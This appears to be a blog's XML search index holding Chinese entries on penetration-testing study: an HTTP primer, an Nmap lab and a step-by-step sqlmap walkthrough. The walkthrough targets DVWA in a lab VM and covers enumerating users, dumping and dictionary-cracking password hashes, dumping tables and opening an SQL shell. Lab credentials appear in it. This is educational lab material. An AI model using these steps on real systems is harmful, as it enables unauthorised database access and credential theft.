    <content type="text"><![CDATA[HTTP介绍 HTTP协议（HyperText Transfer Protocol)，即超文本传输协议，是一种详细规定了浏览器和万维网服务器之间互相通信的规则，他是万维网交换信息的基础，它允许HTML（超文本标记语言）文档从WEB服务器传送到WEB浏览器。是用于从WWW服务器传输超文本到本地浏览器的传送协议。它的发展是万维网协会（World Wide Web Consortium）和Internet工作小组IETF（Internet Engineering Task Force）合作的结果。它可以使浏览器更加高效，使网络传输减少。它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图形)等。 版本最常用的是HTTP1.0/1.1最新版本是HTTP2.0，与1.0/1.1相比，有了更高的性能、安全性和灵活性以前的版本0.9等 HTTP协议在这里首先介绍一下URLURL(统一资源定位符)也被称为网页地址，是互联网标准的地址。标准格式如下：协议://服务器ip [:端口]/路径/[?查询];https://franci4.github.io/uncategorized/Welcome-to-My-Blog.html 就是一个标准的URL. HTTP协议目前最新的版本是2.0，是一种无状态的协议。无状态是指web浏览器与web服务器之间不需要建议持久的连接，这意味着当一个客户向服务器端发起请求，然后web服务器返回响应（Response），连接就关闭了，在服务端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起，而服务器不能主动向客户端发送数据。 HTTP遵循请求（Request）应答（Response）模型，web浏览器向服务器发送请求时，web服务器处理请求并返回适当的应答。 HTTP请求与响应（1）HTTP请求HTTP请求包括三部分，分别是请求行（请求方法），请求头（消息报头）和请求正文。下面是HTTP请求的一个例子。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Nmap之侦测版本和系统]]></title>
    <url>%2FWEB%E5%AE%89%E5%85%A8%2FNmap%2FNmap%E4%B9%8B%E4%BE%A6%E6%B5%8B%E7%89%88%E6%9C%AC%E5%92%8C%E7%B3%BB%E7%BB%9F.html</url>
    <content type="text"><![CDATA[实验目的1、通过对设备或者防火墙的探测来审计它的安全性。2、探测目标主机所开放的端口。3、网络存储，网络映射，维护和资产管理。4、通过识别新的服务器审计网络的安全性。5、探测网络上的主机。 实验原理nmap使用tcp/ip协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由于不同的TCP/IP方案中可能都有自己的特定方案。namp主要是根据这些细节上的差异来判断操作系统的类型。 实验内容主机探测：探测网络上的主机，例如列出响应TCP和ICMP请求、icmp请求、开放特别端口的主机。端口扫描：探测目标主机所开放的端口。版本检测：探测目标主机的网络服务，判断其服务名称及版本号。系统检测：探测目标主机的操作系统及网络设备的硬件特性。支持探测脚本的编写：使用Nmap的脚本引擎（NSE）和Lua编程语言。 实验环境描述1、靶机 带有环境 用户名密码为： admin 1234562、攻击机 带有nmap工具 用户名密码为 root toor 实验步骤1、进入win7虚拟机，开启桌面上xampp工具，开启Apache、和MySQL服务，然后输入ipconfig和ifconfig查看靶机和攻击机的ip地址。]]></content>
      <categories>
        <category>WEB安全</category>
        <category>Nmap</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>工具</tag>
        <tag>渗透测试</tag>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.使用sqlmap获取目标敏感信息实战详解]]></title>
    <url>%2FWEB%E5%AE%89%E5%85%A8%2Fsqlmap%2F1-%E4%BD%BF%E7%94%A8sqlmap%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3.html</url>
    <content type="text"><![CDATA[实验目的1.熟悉sqlmap的基本命令2.使用sqlmap获取目标敏感信息实战 实验原理使用sqlmap获取目标敏感信息实战详解 实验内容使用sqlmap获取目标敏感信息实战详解 实验环境描述靶机系统为windows7 dvwa渗透机系统为kali linux 实验步骤1.首先进入靶机，打开命令提示符，输入命令ipcinfig来查看ip地址。2.进入kali渗透机，打开浏览器访问虚拟机win7的ip地址，浏览正常网页，登录dvwa。3.点击DVWA Security 选择low，点击按钮。4.点击左边的选择框，选择SQL injection。5.点击右上角的设置，open menu-Preferences-Advanced-Network-Settings，选择Manual proxy configuration HTTP Poxy：127.0.0.1；Port：8080.点击ok设置代理完成。6.在kali打开终端输入：burpsuite。7.在poxy选项卡中的intercept选项卡中，将设置为off，不拦截数据包。8.回到dvwa中，在浏览器窗口的SQLinjection界面中的User ID 中输入：1.2，然后把burpsuite打开。点击按钮9.在burpsuite的poxy中的intercept选项卡中出现了一些信息。然后复制cookie中的内容。10.在终端中打开sqlmap进行测试 输入：sqlmap -u ‘url’ –cookie ‘cookie内容’回车，在后面可以加入参数：-b 获取数据库的标题。11.参数–current-user检索DBMS当前用户 获取数据库当前用户。12.–current-db 检索DBMS当前数据库。 获取当前数据库名称。13.–hostname检索DBMS服务器主机名，获取主机名。14.–is-dba检测DBMS当前用户是不是DBA权限。检测当前用户的权限是不是DBA（最高权限）15.–users枚举DBMS用户。 获取数据库的所有用户。16.–passwords枚举DBMS用户密码hashes值。获取数据库用户的密码的hashes值。首先（1）问你是否进行下一步处理，选Y（2）您想对检测到的密码哈希执行基于字典的攻击吗？（Y/N/Q） 选y（3）最后会给你几种选项，使用默认的字典文件-自定义字典文件-带有字典文件列表的文件。选1即可。（4）您想使用常用的密码后缀吗？（慢）（Y/N） 最后他会开始爆破。得出ATABASE管理系统用户密码散列；密码散列和root17.–privilege枚举BDMS用户权限，可以看到root用户的权限最高，可执行的操作最多18.–roles枚举DBMS用户角色。19.–dbs枚举DBMS数据库。获取当前可用的数据库。20.–tables枚举DBMS数据库表，获取不同数据库下的表。21.–columns枚举DBMS数据库表的列。获取不同数据表下的列。22.–schema枚举数据库模式。23.–count检索表的项数目。24.–dump转出数据库表的映射表项目。就得到了登录名和密码，我们试一下logout在用不同的密码登录，但是如果登录，cookie信息就要重新获取。然后再登录。25.–search搜索用，比如：–serach -D dvwa就可以找到这个数据库。26.–comments检索DBMS注释，说明。获取数据库注释信息。27.-D 指定数据库进行枚举。格式为 -D 制定数据库 –tables。获取制定数据库表信息。28.-T 指定表进行枚举，指定数据库 ，制定表获得列信息。格式：-D 制定数据库 -T 制定表 -column29.-C 制定列获取信息 指定数据库-指定表-指定列名获得数据。格式：-D 指定数据库 -T 指定表 -C 指定列 -dump30.-X 枚举DBMS数据库列的时候排除某个列 格式-D 制定数据库 -T 指定表 -X 排除的列 –dump31.–sql-query=QUERY执行sql语句，格式：–sql-query=“SQL语句”执行一条语句。32.–sql-shell提供一个交互式界面，可能会使界面更加简洁一些。33.最后登录成功。]]></content>
      <categories>
        <category>WEB安全</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Welcome to My Blog]]></title>
    <url>%2Funcategorized%2FWelcome-to-My-Blog.html</url>
    <content type="text"><![CDATA[大家好，我是Franci4，一名尚在求学阶段的WEB狗，目前潜心学习渗透测试知识，和队友打打CTF；而这里是我的个人博客，用于记录我学习路上的点点滴滴。 希望我的学习收获能帮助到你~]]></content>
  </entry>
</search>
